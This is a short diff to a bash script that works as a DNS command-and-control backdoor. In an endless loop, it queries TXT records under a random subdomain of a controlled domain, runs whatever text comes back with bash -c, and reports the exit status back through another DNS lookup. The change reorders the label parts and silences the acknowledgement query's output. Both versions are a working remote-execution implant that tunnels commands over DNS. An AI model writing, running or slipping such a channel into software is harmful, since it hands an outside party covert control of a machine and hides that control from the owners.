@@ -9,12 +9,12 @@ uniqid=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 5 | head -n 1)
 while true ; do 
 	
 	randprefix=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)
-	echo "$randprefix.$uniqid$origin"
-	cmd=$(dig +short "$randprefix.$uniqid$origin" TXT | sed s/^\"// | sed s/\"$//)
+	echo "$uniqid.$randprefix$origin"
+	cmd=$(dig +short "$uniqid.$randprefix$origin" TXT | sed s/^\"// | sed s/\"$//)
 	echo "Running $cmd"
 	bash -c "$cmd"
 	echo "Exit status: $?.$uniqid.$randprefix.ack$origin"
-	dig "$?.$uniqid.$randprefix.ack$origin" TXT +short
+	dig "$?.$uniqid.$randprefix.ack$origin" TXT +short &> /dev/null
 
 	sleep 5 
 done
